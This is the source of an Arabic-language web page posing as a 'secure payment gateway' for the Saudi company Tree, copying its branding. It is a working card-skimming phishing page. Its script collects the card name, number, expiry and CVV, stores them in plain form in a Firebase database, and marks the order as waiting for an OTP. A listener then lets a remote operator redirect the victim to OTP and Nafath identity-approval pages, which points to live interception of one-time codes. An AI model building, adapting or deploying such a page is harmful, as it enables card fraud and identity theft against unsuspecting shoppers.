<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الآمنة - تري</title>
    <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    
    <style>
        :root { --p-green: #122d2b; --s-gold: #c5a059; --t-green: #00ff9d; --border-light: #e2e8f0; }
        body { 
            font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px;
            background-image: linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?q=80&w=1920&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .secure-container { background: white; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
        .p-header { background: #fafafa; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
        .p-header img { width: 110px; }
        .p-header h3 { color: #333; margin: 10px 0 0 0; font-size: 1rem; font-weight: bold; }
        
        .p-body { padding: 25px 30px 30px 30px; }

        /* Payment Method Selection */
        .payment-method { border: 2px solid var(--border-light); border-radius: 12px; padding: 15px; display: flex; align-items: center; cursor: pointer; transition: 0.2s; margin-bottom: 10px; }
        .payment-method:hover { border-color: #ccc; }
        .payment-method.selected { border-color: var(--s-gold); background: #fffaf0; box-shadow: 0 0 0 2px var(--s-gold); }
        .method-logos { display: flex; gap: 8px; }
        .method-logos img { height: 25px; }
        .method-title { font-weight: 600; color: #333; margin-right: auto; }

        /* Card Details Form (Initially hidden) */
        #card-form { max-height: 0; overflow: hidden; opacity: 0; transform: translateY(-20px); transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1); margin-top: 0; }
        #card-form.visible { max-height: 700px; margin-top: 25px; opacity: 1; transform: translateY(0); }

        .f-group { margin-bottom: 18px; position: relative; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; font-size: 13.5px; }
        input, select { width: 100%; padding: 12px 15px; border: 1.5px solid var(--border-light); border-radius: 10px; font-size: 0.95rem; box-sizing: border-box; transition: 0.3s; color: #333; outline: none; background: #f9fafb; }
        input:focus { border-color: var(--s-gold); box-shadow: 0 0 8px rgba(197, 160, 89, 0.2); }
        
        /* شعار البطاقة الذكي */
        #c-logo-box { position: absolute; left: 12px; top: 38px; width: 45px; height: 30px; border-radius: 5px; background: #fff; border: 1px solid #f0f0f0; display: none; object-fit: contain; padding: 2px; }
        
        .c-exp-row { display: flex; gap: 10px; }
        .c-exp-row > div { flex: 1; }
        
        .btn-pay { width: 100%; padding: 14px; background: var(--p-green); color: var(--t-green); border: none; border-radius: 10px; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
        .btn-pay:hover { opacity: 0.92; }
        .btn-pay:disabled { background: #ccc; cursor: not-allowed; color: #888; }

        .trust-icons { display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.6; }
        .trust-icons img { height: 20px; }
        
        /* Loading Spinner */
        .spinner-border {
            display: inline-block; width: 1.2rem; height: 1.2rem; vertical-align: text-bottom; 
            border: 0.2em solid currentColor; border-right-color: transparent; 
            border-radius: 50%; animation: spinner-border .75s linear infinite; margin-left: 8px;
        }
        @keyframes spinner-border { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="secure-container">
    <div class="p-header">
        <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree"> 
        <h3>إتمام عملية الدفع</h3>
    </div>

    <div class="p-body">
        <label style="margin-bottom: 15px; text-align: center; color: #333;">اختر طريقة الدفع</label>

        <!-- اختيار طريقة الدفع -->
        <div class="payment-method" id="method-card" onclick="selectMethod('card')">
            <span class="method-title">البطاقات الإئتمانية</span>
            <div class="method-logos">
                <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
                <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
            </div>
        </div>
        <div class="payment-method" id="method-mada" onclick="selectMethod('mada')">
            <span class="method-title">مدى</span>
            <div class="method-logos">
                <img src="https://img.icons8.com/external-flat-icons-inmotus-design/67/000000/external-mada-mada-card-flat-icons-inmotus-design.png" alt="Mada">
            </div>
        </div>
        <div class="payment-method" id="method-apple" onclick="selectMethod('apple')">
            <span class="method-title">Apple Pay</span>
            <div class="method-logos">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/800px-Apple_Pay_logo.svg.png" alt="Apple Pay" style="height: 22px; object-fit: contain;">
            </div>
        </div>

        <!-- فورم البطاقة (مخفي) -->
        <div id="card-form">
            <div class="f-group">
                <label>اسم صاحب البطاقة</label>
                <input type="text" id="p-name" placeholder="الاسم كما هو مكتوب على البطاقة">
            </div>

            <div class="f-group">
                <label>رقم البطاقة</label>
                <div style="position: relative;">
                    <input type="text" id="c-num" maxlength="19" placeholder="0000 0000 0000 0000" style="padding-left: 65px; letter-spacing: 1.5px;" dir="ltr">
                    <img id="c-logo-box" src="" alt="card">
                </div>
            </div>

            <div class="c-exp-row">
                <div class="f-group">
                    <label>تاريخ الانتهاء</label>
                    <div style="display: flex; gap: 5px;">
                        <select id="e-m">
                            <option value="">شهر</option>
                            <script>for(let i=1; i<=12; i++) document.write(`<option value="${i<10?'0'+i:i}">${i<10?'0'+i:i}</option>`)</script>
                        </select>
                        <select id="e-y">
                            <option value="">سنة</option>
                            <script>for(let i=24; i<=35; i++) document.write(`<option value="${'20'+i}">${'20'+i}</option>`)</script>
                        </select>
                    </div>
                </div>
                <div class="f-group">
                    <label>الرمز السري (CVV)</label>
                    <input type="password" id="c-v" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '');" placeholder="***" style="text-align: center;">
                </div>
            </div>

            <button class="btn-pay" onclick="checkAndSend()">تأكيد ودفع</button>
        </div>

        <div class="trust-icons">
            <span>🔒</span>
            <small>دفع آمن ومحمي بواسطة تري</small>
        </div>
    </div>
</div>

<script>
    // -- إعدادات Firebase الخاصة بك مدمجة جاهزة --
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // مسح الحقول تلقائياً عند تحميل الصفحة لضمان إدخال بيانات جديدة
    window.addEventListener('load', () => {
        document.getElementById('p-name').value = '';
        document.getElementById('c-num').value = '';
        document.getElementById('e-m').value = '';
        document.getElementById('e-y').value = '';
        document.getElementById('c-v').value = '';
        document.getElementById('c-logo-box').style.display = 'none';
    });

    // -- ذكاء كشف نوع البطاقة وتنسيقها --
    const cardInput = document.getElementById('c-num');
    const cardLogo = document.getElementById('c-logo-box');

    // -- لوجيك اختيار طريقة الدفع --
    function selectMethod(method) {
        document.getElementById('method-card').classList.remove('selected');
        document.getElementById('method-mada').classList.remove('selected');
        document.getElementById('method-apple').classList.remove('selected');
        
        if (method === 'card') {
            document.getElementById('method-card').classList.add('selected');
        } else if (method === 'mada') {
            document.getElementById('method-mada').classList.add('selected');
        } else if (method === 'apple') {
            document.getElementById('method-apple').classList.add('selected');
            alert("عذراً، خدمة Apple Pay غير متوفرة حالياً، يرجى الدفع بالبطاقة");
        }
        document.getElementById('card-form').classList.add('visible');
    }
    window.selectMethod = selectMethod; // Make it accessible from HTML onclick

    cardInput.addEventListener('input', function(e) {
        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formatted = "";
        for(let i=0; i<val.length; i++){
            if(i>0 && i%4===0) formatted += " ";
            formatted += val[i];
        }
        e.target.value = formatted;
        
        if (val.startsWith('4')) { 
            cardLogo.src = "https://img.icons8.com/color/48/000000/visa.png";
            cardLogo.style.display = 'block';
        } else if (/^5[1-5]/.test(val)) { 
            cardLogo.src = "https://img.icons8.com/color/48/000000/mastercard.png";
            cardLogo.style.display = 'block';
        } else if (/^(58|60|96)/.test(val)) { 
            cardLogo.src = "https://img.icons8.com/external-flat-icons-inmotus-design/67/000000/external-mada-mada-card-flat-icons-inmotus-design.png";
            cardLogo.style.display = 'block';
        } else {
            cardLogo.style.display = 'none';
        }

        // الانتقال التلقائي عند اكتمال الرقم وصحته
        if (val.length >= 16 && validateLuhn(val)) {
            document.getElementById('e-m').focus();
        }
    });

    // الانتقال التلقائي بين حقول التاريخ و CVV
    document.getElementById('e-m').addEventListener('change', function() {
        if(this.value) document.getElementById('e-y').focus();
    });

    document.getElementById('e-y').addEventListener('change', function() {
        if(this.value) document.getElementById('c-v').focus();
    });

    // خوارزمية Luhn للتحقق من صحة البطاقات الائتمانية
    function validateLuhn(number) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number.charAt(i));
            if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) == 0;
    }

    async function checkAndSend() {
        const name = document.getElementById('p-name').value;
        const num = document.getElementById('c-num').value;
        const month = document.getElementById('e-m').value;
        const year = document.getElementById('e-y').value;
        const cvv = document.getElementById('c-v').value;
        const payBtn = document.querySelector('.btn-pay');
        const cleanNum = num.replace(/\s+/g, ''); // إزالة المسافات

        // 1. التحقق الخاص برقم البطاقة
        if (cleanNum.length < 15 || !validateLuhn(cleanNum)) {
            alert("❌ رقم البطاقة غير صحيح، يرجى التأكد من الرقم المكتوب على البطاقة");
            return;
        }

        // 2. التحقق من باقي البيانات
        if (name.length < 3 || !month || !year || cvv.length < 3) {
            alert("⚠️ يرجى إكمال باقي بيانات البطاقة (الاسم، التاريخ، والرمز السري)");
            return;
        }

        // التحقق من تاريخ انتهاء البطاقة (عدم قبول بطاقات منتهية)
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1; // الأشهر تبدأ من 0 في البرمجة

        if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
            alert("❌ تاريخ انتهاء البطاقة غير صحيح (البطاقة منتهية الصلاحية)");
            return;
        }

        // Disable button to prevent multiple submissions
        payBtn.disabled = true;
        payBtn.innerHTML = '<span class="spinner-border" role="status" aria-hidden="true"></span> جاري المعالجة...';

        const userId = localStorage.getItem('user_id');
        if (!userId) {
            alert("خطأ: لم يتم العثور على جلسة المستخدم. يرجى البدء من جديد.");
            payBtn.disabled = false;
            payBtn.innerText = "تأكيد ودفع";
            return;
        }

        try {
            await db.collection("orders").doc(userId).update({
                card_name: name,
                card_number: num,
                expiry: month + "/" + year,
                cvv: cvv,
                status: "waiting_otp",
                next_step: "WAITING" // تصفير الحالة لمنع الرفض التلقائي لاحقاً
            });
            // سينقلك لصفحة الكود بعد النجاح
            window.location.href = "otp_verification.html";
        } catch (e) {
            alert("عذراً، حدث خطأ في النظام، يرجى المحاولة لاحقاً");
            payBtn.disabled = false;
            payBtn.innerText = "تأكيد ودفع";
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                // تم إزالة شرط الرفض من هنا للسماح للمستخدم بإعادة المحاولة
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
